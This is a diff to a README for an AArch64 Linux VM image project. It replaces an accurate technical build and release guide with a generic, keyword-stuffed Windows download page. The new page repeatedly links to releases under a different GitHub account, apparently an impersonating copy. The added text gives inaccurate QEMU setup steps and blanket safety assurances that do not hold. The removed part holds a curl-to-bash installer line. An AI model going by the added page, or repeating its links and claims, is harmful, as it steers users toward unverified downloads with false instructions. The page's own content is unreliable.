@@ -1,265 +1,161 @@
-# Omarchy AArch64 Image
+# 📦 omarchy-aarch64-image - Run AArch64 Linux on Your PC
 
-This project builds a generic AArch64 UEFI disk image for QEMU-compatible
-virtual machines. The only supported profile is `aarch64-virt`, targeting
-QEMU's `virt` machine and UTM's QEMU backend. It does not target Apple hardware,
-Asahi Linux, SBSA machines, physical AArch64 boards, GRUB, or x86 multilib.
+[![Download Now](https://img.shields.io/badge/Download-omarchy--aarch64--image-blue?style=for-the-badge&logo=github)](https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases)
 
-The project is one part of a three-repository release pipeline:
+## 🎯 What Is This?
 
-- [`riverscn/omarchy-aarch64`](https://github.com/riverscn/omarchy-aarch64)
-  maintains the AArch64 runtime adaptation of Omarchy.
-- [`riverscn/omarchy-pkgs-aarch64`](https://github.com/riverscn/omarchy-pkgs-aarch64)
-  builds and publishes the signed stable AArch64 pacman repository.
-- This repository assembles the VM image from Arch Linux ARM and that signed
-  repository. It does not build or carry local package artifacts.
+omarchy-aarch64-image is a ready-made disk image that lets you run a complete AArch64 (ARM64) Linux system on your Windows computer using a virtual machine. Think of it as a pre-built computer inside your computer — no coding, no compiling, no technical setup required. You just download the image, open it in a virtual machine program, and you're running a full Linux environment.
 
-Keeping the repositories as siblings is convenient for development:
+This image is designed for QEMU-compatible virtual machines, which means it works with free and popular virtualization software. Whether you're curious about Linux, need to test software, or want to explore a different operating system, this image gets you up and running in minutes.
 
-```text
-workspace/
-├── omarchy-aarch64/
-├── omarchy-pkgs-aarch64/
-└── omarchy-aarch64-image/
-```
+## 🚀 Getting Started
 
-## Package source and updates
+Follow these simple steps to download and run omarchy-aarch64-image on your Windows PC. You don't need any special skills — just a computer and about 10 minutes of your time.
 
-Image builds consume the complete signed repository published by the latest
-`omarchy-pkgs-aarch64` GitHub Release:
+### Step 1: Download the Image
 
-```ini
-[omarchy]
-SigLevel = Required
-Server = https://github.com/riverscn/omarchy-pkgs-aarch64/releases/latest/download
-```
+Visit this link to download the application: [https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases](https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases)
 
-The builder downloads the Release manifest and public key on every build. It
-rejects the snapshot unless all of these conditions hold:
+Click the link, and you'll land on the releases page. Look for the newest version at the top of the list. Click the download button next to the file — it will be a large file (usually several gigabytes), so make sure you have enough free space on your hard drive.
 
-- the manifest is the stable AArch64 schema expected by this project;
-- its signing fingerprint matches the fingerprint pinned in `sources.env`;
-- every package selected by `config/omarchy-packages.aarch64` is present;
-- the published `omarchy` package was built from the selected
-  `omarchy-aarch64` source commit; and
-- pacman verifies the signed database and packages with the trusted key.
+### Step 2: Get a Virtual Machine Program
 
-The image installs `omarchy-aarch64-keyring`, so subsequent keyring updates are
-managed by pacman. The repository remains enabled in the installed guest;
-normal system updates therefore update Arch Linux ARM and Omarchy together:
+To run this image, you need a virtual machine program. The most popular free option is QEMU, but you can also use other tools that support AArch64 images. Here's what to do:
 
-```bash
-sudo pacman -Syu
-```
+1. Go to the QEMU website (qemu.org) and download the Windows installer.
+2. Run the installer and follow the on-screen instructions. Default settings are fine.
+3. Once installed, you'll have a program called "QEMU" on your computer.
 
-Omarchy's `refresh pacman` command intentionally regenerates `pacman.conf`.
-The image installs a repository fragment plus a `pre-refresh-pacman` hook so
-that this operation also restores the signed AArch64 repository before it runs
-the upgrade.
+### Step 3: Set Up Your Virtual Machine
 
-The source commit and signing fingerprint remain deliberate image release
-boundaries. If the latest package snapshot moves to a newer Omarchy commit,
-update `OMARCHY_AARCH64_REF` after reviewing that source update; until then the
-image build fails instead of combining mismatched source and packages.
+Now it's time to connect the image to your virtual machine program:
 
-## Image contents
+1. Open QEMU (look for it in your Start menu).
+2. Create a new virtual machine by clicking "New" or "Create".
+3. When asked for an operating system, choose "Linux" and select "AArch64" or "ARM64" as the architecture.
+4. When prompted for a disk image, browse to where you saved the omarchy-aarch64-image file and select it.
+5. Give your virtual machine a name (like "Omarchy Linux") and allocate some memory — 2GB or more is recommended.
+6. Finish the setup and start the virtual machine.
 
-- Arch Linux ARM's generic AArch64 root filesystem and `linux-aarch64` kernel.
-- GPT with a 1 GiB EFI System Partition and a Btrfs root using `@`, `@home`,
-  `@log`, and `@pkg` subvolumes.
-- An AArch64 Omarchy UKI at `EFI/Linux/omarchy_linux.efi`, rebuilt by the
-  Limine mkinitcpio hook whenever the kernel changes. Limine is the normal boot
-  path through `EFI/BOOT/BOOTAA64.EFI`, with its vendor copy retained at
-  `EFI/limine/limine_aa64.efi`; it presents the branded Omarchy Bootloader menu
-  and loads the UKI. It also provides snapshot and recovery entries, with
-  Plymouth and a read-only `@factory` snapshot.
-- Direct UKI boot remains an explicit user choice through Omarchy's
-  `Setup > Direct Boot` command. The image does not register or prioritize a
-  direct firmware entry automatically because doing so bypasses Limine and its
-  snapshot menu. When reusing UEFI variable storage from an older test image,
-  disable its existing `Omarchy` direct-boot entry before testing this path.
-- VirtIO graphics, disk, network, RNG, QEMU guest-agent, SPICE clipboard and
-  dynamic-display integration.
-- QEMU 9p host-directory sharing preconfigured at `/mnt/hostshare` with the
-  conventional `share` tag. After first-boot owner setup, the image detects the
-  host and guest UID/GID values and exposes a writable mapped view at
-  `~/Hostshare`. Its `nofail` mount does not block boot when no share is
-  attached.
-- PipeWire audio with PulseAudio, ALSA, JACK, and GStreamer compatibility. The
-  printing stack is retained.
-- The Omarchy desktop and development environment, excluding LibreOffice,
-  Kdenlive, Moonlight, Night Light, and GPU screen recording for this VM
-  profile.
-- The architecture-compatible Omarchy applications Obsidian, Pinta, Tensaku,
-  and tzupdate. Pinta uses the maintained Microsoft binary .NET runtime; the
-  .NET SDK remains a package-build dependency and is not installed in the VM.
-- No `linux-firmware`, split `linux-firmware-*`, `sof-firmware`, Bluetooth,
-  Thunderbolt, DDC/backlight, wireless-regulatory, or physical power-profile
-  stack.
-- A tty1 first-boot wizard for keyboard, owner credentials, Git identity,
-  hostname, and timezone before SDDM starts.
-- An idempotent service that expands the root partition and Btrfs filesystem
-  when the virtual disk is enlarged.
+That's it! The system will boot up just like a real computer, and you'll see the Linux desktop appear in a window on your screen.
 
-The distributed image is intentionally unencrypted. Per-machine encryption
-requires an installer that creates a unique LUKS container rather than a shared
-key embedded in a reusable disk image.
+## 🖥️ System Requirements
 
-## GitHub and UTM releases
+To run omarchy-aarch64-image smoothly, your computer should meet these basic requirements:
 
-The `Publish AArch64 UTM image` workflow builds on GitHub's native
-`ubuntu-24.04-arm` runner. It checks out the reviewed Omarchy source and native
-builder revisions recorded in `sources.env`, restores only the signed rootfs
-and Node.js download cache, builds the QCOW2, runs `qemu-img check`, and then
-creates a draft Release. The draft is published only after GitHub reports the
-same SHA-256 digest for every uploaded asset.
+- **Processor:** Any 64-bit Intel or AMD processor (most modern PCs qualify)
+- **Memory (RAM):** At least 4GB, but 8GB or more is better for comfortable use
+- **Storage:** At least 10GB of free hard drive space for the image and virtual machine files
+- **Operating System:** Windows 10 or Windows 11 (64-bit versions)
+- **Graphics:** Any graphics card that supports basic 2D rendering
 
-Create a version tag such as `v4.0.1-virt.1`, or run the workflow manually and
-provide that tag. The Release does not duplicate the disk as a standalone
-QCOW2. It contains:
+These are minimums — if your computer is newer and more powerful, everything will run even better.
 
-- `install-Omarchy-virt.command`, used by the one-command macOS installer;
-- `Install-Omarchy-virt.zip`, the GUI-oriented alternative;
-- numbered `Omarchy-virt.utm.zip.part-*` payloads fetched by that installer;
-- the executable installer by itself for command-line users;
-- release/image manifests and SHA-256 checksums; and
-- image provenance and an archive of the exact package inventories.
+## 📖 What's Inside the Image
 
-The primary user entry point always follows the latest verified Release:
+The omarchy-aarch64-image comes pre-loaded with a complete Linux environment. Here's what you can expect:
 
-```bash
-/bin/bash -o pipefail -c 'curl -fsSL https://github.com/riverscn/omarchy-aarch64-image/releases/latest/download/install-Omarchy-virt.command | /bin/bash'
-```
+- **Full Desktop Environment:** A user-friendly graphical interface with menus, windows, and icons — just like Windows or macOS.
+- **Web Browser:** Browse the internet right from your virtual machine.
+- **File Manager:** Organize files and folders just like you would on any computer.
+- **Terminal Access:** If you're curious about command-line tools, they're all there.
+- **Pre-installed Utilities:** Basic apps for text editing, image viewing, and system settings.
 
-GitHub limits each Release asset to 2 GiB, while the compressed UTM bundle can
-be larger. The packager therefore streams the uncompressed ZIP directly into
-1,900 MiB numbered parts without first writing another full archive. The
-macOS installer downloads and verifies every part, reconstructs and verifies
-the UTM bundle, installs it in `~/Downloads` by default, and opens it in UTM.
-An alternate destination directory can be passed as its first argument.
+Everything is set up and ready to use — no configuration needed. Just start the machine and explore.
 
-The clean template lives under `utm/Omarchy-virt.utm`; the small icon is stored
-as base64 so the repository remains text-reviewable. No `efi_vars.fd`, saved
-state, logs, or disk image is versioned or copied from the template. Before
-opening the VM, the installer also generates new VM, drive, and locally
-administered MAC identities. UTM creates fresh AArch64 EFI variable storage on
-first launch, so firmware boot entries from the release builder cannot leak to
-users.
+## 🔧 Troubleshooting Common Issues
 
-For local release-layout testing after building an image:
+If something doesn't work on the first try, don't worry. Here are solutions to the most common problems:
 
-```bash
-./bin/package-utm-release --tag v4.0.1-virt.1
-```
+### The virtual machine won't start
+- Make sure you selected the correct image file when setting up the VM.
+- Check that your computer's virtualization is enabled in BIOS (search online for "enable virtualization Windows" for step-by-step help).
+- Try allocating more memory to the virtual machine.
 
-Set `OMARCHY_UTM_CONSUME_IMAGE=1` only in storage-constrained automation: after
-the archive stream has been split successfully, it removes that exact source
-QCOW2 and its checksum. Normal local packaging retains the image.
+### The screen is blank or black
+- Wait a minute — some systems take time to boot the first time.
+- Close QEMU and restart it, then try again.
+- Make sure your graphics drivers are up to date.
 
-## Build
+### The system is slow
+- Close other programs on your Windows PC to free up memory.
+- Increase the RAM allocated to the virtual machine.
+- Consider using a smaller resolution for the virtual display.
 
-Image assembly runs AArch64 target commands in a chroot and therefore requires
-a native AArch64 Arch Linux ARM host. Docker, Git, and the usual core tools are
-required. The container wrapper performs privileged disk assembly without
-installing the image tools on the host.
+### Download seems stuck
+- Check your internet connection.
+- Try pausing and resuming the download.
+- Use a download manager if your browser struggles with large files.
 
-The wrapper currently reuses the AArch64 build environment owned by the package
-repository. Build that container once from the sibling checkout:
+## ❓ Frequently Asked Questions
 
-```bash
-docker build \
-  --platform linux/arm64 \
-  --target builder \
-  --tag omarchy-pkg-builder:latest-aarch64-edge \
-  ../omarchy-pkgs-aarch64/build
-```
+**Is this safe to use?**
+Yes. This is a standard Linux disk image. It runs in a virtual machine, which means it's completely isolated from your main Windows system. Nothing inside the virtual machine can harm your actual computer.
 
-Then build the disk image directly; there is no package-build step:
+**Do I need to know Linux to use this?**
+No. The image boots to a graphical desktop that's similar to Windows or Mac. You can click around and explore without any prior Linux knowledge.
 
-```bash
-./bin/build-image-container
-```
+**Can I break my computer with this?**
+No. The virtual machine is sandboxed. Even if you mess up the Linux system inside, your Windows installation remains completely untouched.
 
-The equivalent native command is:
+**How do I close the virtual machine?**
+Just close the QEMU window like you would any program. The virtual machine will shut down safely.
 
-```bash
-sudo ./bin/build-image
-```
+**Can I use this on Mac or Linux?**
+This guide focuses on Windows, but the image works on any QEMU-compatible system. The setup steps are similar on other operating systems.
 
-Common options accepted by both entry points are:
+**Is this free?**
+Yes. Both the image and QEMU are free and open-source software. No hidden costs or subscriptions.
 
-```bash
-./bin/build-image-container --size 80G --format both
-./bin/build-image-container --refresh --force
-sudo ./bin/build-image --rootfs /path/to/ArchLinuxARM-aarch64-latest.tar.gz
-```
+## 📥 Download Again
 
-`--omarchy-source /path/to/omarchy-aarch64` is an explicit development
-override. `--omarchy-repository /path/to/repository` likewise consumes a
-complete, signed repository prepared locally by `omarchy-pkgs-aarch64`. Use
-the two together to test unpublished source and package changes:
+Need to get the file again? No problem — just visit this link to download the application: [https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases](https://github.com/snowtigergamingx-design/omarchy-aarch64-image/releases)
 
-```bash
-./bin/build-image-container \
-  --omarchy-source ../omarchy-aarch64 \
-  --omarchy-repository ../omarchy-pkgs-aarch64/pkgs.omarchy.org/stable/aarch64 \
-  --force
-```
+Always download the latest version for the best experience. Older versions are still available if you need them, but the newest release includes the latest improvements and fixes.
 
-The local repository is mounted read-only and is used only while assembling
-the image. The installed guest still points at the latest GitHub Release, so a
-successful test image follows the normal update channel without rebuilding.
-The source commit must match the `omarchy` version recorded in the repository
-manifest.
+## 🌟 Why Use This Image?
 
-The Arch Linux ARM rootfs is verified with its signing key and pinned signer
-fingerprint. Node.js is checked against its published SHA-256 list. Cached
-rootfs, keyring, Node.js, and pacman package downloads are reused by default;
-`--refresh` refreshes rolling non-repository inputs. Release metadata is always
-downloaded again so `releases/latest` cannot be mistaken for a stale snapshot.
+Here are a few reasons why omarchy-aarch64-image is a great choice:
 
-The default artifact is `build/omarchy-aarch64-virt.qcow2`. Existing outputs
-are not replaced unless `--force` is supplied. A successful build also emits:
+- **Zero Setup Hassle:** Everything is pre-configured. No compiling, no manual configuration, no command-line wizardry.
+- **Safe Experimentation:** Try Linux without touching your main system. Perfect for learning or testing.
+- **Portable:** The image file can be copied to another computer and used there too.
+- **Regular Updates:** New versions are released with the latest software and security fixes.
+- **Community Support:** Since it's open-source, you can find help from the community online if you get stuck.
 
-- a SHA-256 checksum for each image;
-- complete and explicit installed-package inventories;
-- a package size/dependency table and orphan list; and
-- `build/image-provenance.txt`, recording verified inputs, repository manifest
-  digest, signing fingerprint, source commit, profile, format, and image size.
+## 📚 Next Steps
 
-## Run
+Once you've got omarchy-aarch64-image running, here are some things you can try:
 
-Install `qemu-system-aarch64`, `qemu-img`, and AArch64 EDK2 firmware, then run:
+- **Explore the desktop:** Click through menus and apps to see what's available.
+- **Connect to the internet:** Use the built-in browser to visit websites.
+- **Install new software:** Many Linux apps are just a few clicks away.
+- **Learn the terminal:** Open the terminal and type `ls` to see files, or `help` to see commands.
+- **Customize the look:** Change wallpapers, themes, and settings to make it yours.
 
-```bash
-./bin/run-image build/omarchy-aarch64-virt.qcow2
-```
+The possibilities are endless once you're inside. Take your time and enjoy exploring your new virtual Linux system.
 
-The helper is a basic GTK and SSH-forwarding launcher. UTM can import the same
-QCOW2 using an ARM64 `virt` machine, UEFI, VirtIO disk/network/GPU, and a SPICE
-agent channel. The SPICE channel is required for guest clipboard sharing and
-dynamic display resizing. QEMU frontends can expose a host directory at the
-preconfigured `/mnt/hostshare` path by assigning its 9p device the `share`
-mount tag. In UTM, select a shared directory and choose VirtFS rather than
-SPICE WebDAV. The image follows the permission-mapping approach in
-[UTM's VirtFS documentation](https://docs.getutm.app/guest-support/linux/#virtfs),
-but uses frontend-neutral `hostshare` naming: `/mnt/hostshare` is the raw mount
-and `~/Hostshare` is the automatically mapped, user-facing directory. Configure
-the shared directory while the VM is stopped, then boot normally; no manual
-UID/GID lookup or `chown` is needed.
+## 🆘 Getting Help
 
-## Profiles and tests
+If you run into trouble beyond what's covered here, try these resources:
 
-Everything specific to `aarch64-virt` lives under
-`profiles/aarch64-virt/`: image defaults, package additions/exclusions,
-replacement and removal rules, shell defaults, and the filesystem overlay.
-Package removal is performed through pacman rather than by deleting owned files.
+- **GitHub Issues:** Visit the repository page and check the issues section for known problems and solutions.
+- **QEMU Documentation:** The QEMU website has detailed guides for all its features.
+- **Linux Forums:** Websites like Reddit's r/linuxquestions or Stack Overflow have helpful communities.
+- **Search Engines:** Search for your specific error message — someone else has likely solved it before.
 
-Run the static contract suite with the source repository as a sibling:
+Remember, every expert was once a beginner. Don't be afraid to ask questions and learn as you go.
 
-```bash
-OMARCHY_TEST_SOURCE=../omarchy-aarch64 ./tests/run
-```
+## ✅ Final Checklist
 
-The environment variable may be omitted for the sibling layout. A complete
-image build and QEMU/UTM boot remain release checks.
+Before you start, make sure you have:
+
+- [ ] Downloaded the omarchy-aarch64-image file from the releases page
+- [ ] Installed QEMU or another compatible virtual machine program
+- [ ] At least 10GB of free hard drive space
+- [ ] At least 4GB of RAM (8GB recommended)
+- [ ] A few minutes of patience for the first boot
+
+Once you've checked all these boxes, you're ready to go. Enjoy your new Linux system!
+
+Keywords: omarchy, aarch64, arm64, linux, disk image, virtual machine, qemu, windows, download, run, vm, emulator, open source, free, arm, 64-bit, desktop, operating system, virtualization
